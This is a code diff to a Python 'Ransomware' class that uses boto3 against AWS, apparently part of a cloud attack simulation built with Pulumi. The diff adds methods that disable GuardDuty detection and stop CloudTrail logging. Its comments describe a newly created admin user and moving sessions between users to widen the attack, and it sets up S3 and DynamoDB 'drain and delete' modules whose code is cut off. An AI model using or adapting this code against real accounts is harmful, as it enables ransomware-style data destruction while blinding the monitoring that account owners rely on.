@@ -2,6 +2,8 @@ import boto3
 import json
 import os
 import time
+from DisableGD_CT import disable_guardduty, stop_cloudtrail_logging
+from Load_Pulumi_Outputs import get_pulumi_output
 
 class Ransomware:
     """Handles AWS session initialization and attack modules for S3 and DynamoDB"""
@@ -9,35 +11,56 @@ class Ransomware:
     def __init__(self, access_key, secret_key, region='us-east-1'):
 
 
-        # Ensure AWS picks up only the new credentials
+        # Ensure AWS picks up only the new credentials by deleting
+        # any previous sessions in the global python runtime, 
+        # this is cruicial for transferring sessions to expand
+        # to other users in multi-user encompassing attack vectors
         boto3.setup_default_session()
 
         # AWS IAM propagation delay
-        print("⌛ Waiting for IAM propagation...")
+        print(" Waiting for IAM propagation...")
         time.sleep(5)  # Add a delay before using new credentials
 
 
         """Initialize a boto3 session with given credentials"""
+        # This is the newly created user for ransomware that got admin 
+        # privileges attached to it for s3 & dynamodb
         self.session = boto3.Session(
             aws_access_key_id=access_key,
             aws_secret_access_key=secret_key,
             region_name=region
         )
         
-        # Initialize attack modules
+        # Initialize attack modules for variable reference in Ransomware class imports
         self.s3_drain = self.S3_Drain_Delete(self.session)
         self.dynamodb_drain = self.DynamoDB_Drain_Delete(self.session)
+
+
+        # Dynamically fetching GuardDuty and CloudTrail details from Pulumi outputs
+        self.guardduty_id = get_pulumi_output("gd_detector_id")  
+        self.cloudtrail_name = get_pulumi_output("cloudtrail_name") 
+
 
     def session_test(self):
         """Test the AWS session by getting caller identity"""
         try:
             sts_client = self.session.client("sts")
             identity = sts_client.get_caller_identity()
-            print(f"🔍 Confirmed AWS Identity: {identity['Arn']}")
+            print(f" Confirmed AWS Identity: {identity['Arn']}")
             return True
         except Exception as e:
-            print(f"❌ ERROR: Invalid session credentials: {e}")
+            print(f" ERROR: Invalid session credentials: {e}")
             return False
+
+    def disable_guardduty(self):
+        """Executes GuardDuty disable and CloudTrail logging stop"""
+        disable_guardduty(self.session, self.guardduty_id)
+
+    def stop_cloudtrail_logging(self):
+        """Executes GuardDuty disable and CloudTrail logging stop"""
+        stop_cloudtrail_logging(self.session, self.cloudtrail_name)
+    
+
     
     class S3_Drain_Delete:
         def __init__(self, session):
